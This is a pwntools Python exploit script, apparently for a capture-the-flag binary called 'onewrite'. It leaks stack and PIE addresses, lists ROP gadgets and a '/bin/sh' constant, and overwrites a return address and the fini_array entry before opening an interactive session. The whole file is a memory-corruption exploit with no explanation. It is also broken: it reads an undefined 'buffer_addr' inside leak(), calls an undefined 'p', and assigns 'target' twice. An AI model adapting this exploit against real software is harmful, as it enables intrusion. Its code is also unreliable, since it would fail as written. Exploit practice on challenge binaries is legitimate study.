from pwn import *

gdbcmds = '''
b *do_leak+162
c
'''
target = gdb.debug('./onewrite', gdbscript=gdbcmds)
target = process('./onewrite')
elf = ELF('onewrite')

popRdx = 0x000000000044c6b6
popRsi = 0x000000000000d9f2
popRdi = 0x00000000000084fa
popRax = 0x00000000000460ac
movRsitoRdi = 0x00000000000437db # mov qword ptr [rdi], rsi ; ret
syscall = 0x000000000000917c
binsh = 0x0068732f6e69622f
bss = 0x7ffff7ead500
ret = 0x0000000000008076

def write(adr, val):
    print(target.recvuntil(b":"))
    target.send(adr)
    print(target.recvuntil(b": "))
    target.send(val)

def leak(opt):
    print(target.recvuntil(b"> "))
    target.sendline(opt)
    addr = target.recvline()
    addr = int(buffer_addr.strip(), 16)
    return addr


buffer_addr = leak(b"1")
rdi_saved = buffer_addr + 24
print("Leak: ", hex(rdi_saved))
write(str(rdi_saved).encode(), b"\x15\x8a")

pie_addr = leak(b"2")
base = pie_addr - elf.symbols['do_leak']
print("Leak: ", hex(pie_addr))

fini_arr = base + elf.symbols["__do_global_dtors_aux_fini_array_entry"]
do_overwrite = base + p.symbols["do_overwrite"]
csu_fini = base + p.symbols["__libc_csu_fini"]


fini_addr = pie_addr+0x2a559b
print(hex(fini_addr))
print(target.recvuntil(b":"))
target.send(str(fini_addr).encode())

dooverwrite_addr = pie_addr-82
print(hex(dooverwrite_addr))
print(target.recvuntil(b"data :"))
target.send(p64(dooverwrite_addr))





target.interactive()
